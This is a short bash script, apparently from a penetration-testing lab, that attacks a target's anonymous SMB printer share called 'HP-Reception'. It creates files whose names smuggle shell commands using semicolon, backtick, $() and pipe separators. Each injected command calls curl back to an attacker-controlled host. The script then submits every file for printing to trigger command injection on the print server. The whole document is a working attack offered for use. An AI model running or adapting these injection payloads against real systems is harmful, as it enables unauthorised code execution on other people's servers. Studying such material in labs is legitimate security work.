#!/bin/bash
set -x
TARGET=10.129.244.177
LHOST=10.10.14.180
WORKDIR=$(mktemp -d)
cd "$WORKDIR" || exit 1

# Payload 1: semicolon command separator
touch "a;curl ${LHOST}:8000/semi;.txt"
# Payload 2: backtick command substitution
touch "a\`curl ${LHOST}:8000/backtick\`.txt"
# Payload 3: dollar-paren command substitution
touch "a\$(curl ${LHOST}:8000/dollarparen).txt"
# Payload 4: pipe
touch "a|curl ${LHOST}:8000/pipe|.txt"

ls -la "$WORKDIR"

for f in *.txt; do
  echo "=== Printing: $f ==="
  smbclient -N "//${TARGET}/HP-Reception" -c "print \"$f\"" 2>&1
  sleep 2
done

echo "DONE"
